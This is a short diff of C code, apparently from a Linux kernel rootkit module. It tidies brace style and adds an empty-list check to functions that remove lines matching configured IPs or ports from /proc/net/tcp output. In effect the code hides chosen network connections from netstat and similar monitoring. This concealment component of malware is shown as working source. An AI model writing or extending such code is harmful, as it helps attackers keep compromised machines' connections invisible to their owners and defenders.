@@ -1,7 +1,6 @@
 #include "utils/excludes/ip_filtering.h"
 
-void ip_to_hex(const char *ip_str, char *hex_buf)
-{
+void ip_to_hex(const char *ip_str, char *hex_buf) {
     u32 ip = in_aton(ip_str);
     sprintf(hex_buf, "%02X%02X%02X%02X",
             (ip >> 0) & 0xFF,
@@ -10,20 +9,22 @@ void ip_to_hex(const char *ip_str, char *hex_buf)
             (ip >> 24) & 0xFF);
 }
 
-void port_to_hex(unsigned int port, char *hex_buf)
-{
+void port_to_hex(unsigned int port, char *hex_buf) {
     sprintf(hex_buf, "%04X", port);
 }
 
-int should_exclude_line(const char *line)
-{
+int should_exclude_line(const char *line) {
+    if (NET_EXCLUDES[0] == '\0') { // NET_EXCLUDES WAS NOT SET
+        return 0;
+    } 
+
     char excludes[] = NET_EXCLUDES;  // copy macro to a mutable array
     char *token;
     char *temp_excludes = excludes;
     char search_str[16];
 
     while ((token = strsep(&temp_excludes, ",")) != NULL) {
-        if (*token == '\0') {
+        if (*token == '\0') { // might happen due to a misplaced comma
             continue;
         }
         if (strchr(token, '.')) { // ip contains ".", otherwise port
@@ -47,8 +48,7 @@ int should_exclude_line(const char *line)
  * filter_netstat_lines - Filter out lines from a netstat output buffer (from /proc/net/tcp)
  * that contain any of the IPs or PORTS defined in the global NET_EXCLUDES macro.
  */
-char *filter_netstat_lines(const char *buf, size_t *new_len)
-{
+char *filter_netstat_lines(const char *buf, size_t *new_len) {
     size_t buf_len = strlen(buf);
     char *new_buf;
     size_t out_index = 0;
